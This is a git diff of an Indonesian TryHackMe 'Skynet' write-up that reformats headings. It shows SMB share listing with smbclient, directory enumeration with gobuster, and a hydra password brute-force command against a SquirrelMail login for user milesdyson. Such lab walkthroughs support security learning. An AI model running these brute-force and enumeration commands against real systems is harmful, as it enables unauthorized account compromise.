@@ -55,7 +55,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 627.49 seconds
 ```
 
-### Enumerasi SMB
+## Enumerasi SMB
 - Gunakan perintah `smbclient -L <IP Machine>` untuk membuka list shares. Disini ditemukan user **anonymous** dan **milesdyson** pada SMB Server
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%201.JPG)
@@ -80,7 +80,7 @@ Nmap done: 1 IP address (1 host up) scanned in 627.49 seconds
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%206.JPG)
 
-### Gobuster Report
+## Gobuster Report
 - Baris perintah: `gobuster dir -u http://<IP Machine> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt`
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%207.JPG)
@@ -89,12 +89,15 @@ Nmap done: 1 IP address (1 host up) scanned in 627.49 seconds
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%208.JPG)
 
-### Exploit
+## Exploit
 - Lakukan Inspek Element lalu pindah tab **Network** dan lakukan percobaan login
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%209.JPG)
 
-- Brute force akun user **milesdyson** dengan tool hydra dengan perintah `hydra -l milesdyson -P log1.txt <IP Machine> http-form-post '/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown User or password incorrect.'`
+- Brute force akun user **milesdyson** dengan tool hydra dengan perintah sebagai berikut
+```sh
+hydra -l milesdyson -P log1.txt <IP Machine> http-form-post '/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown User or password incorrect.'
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2010.JPG)
 
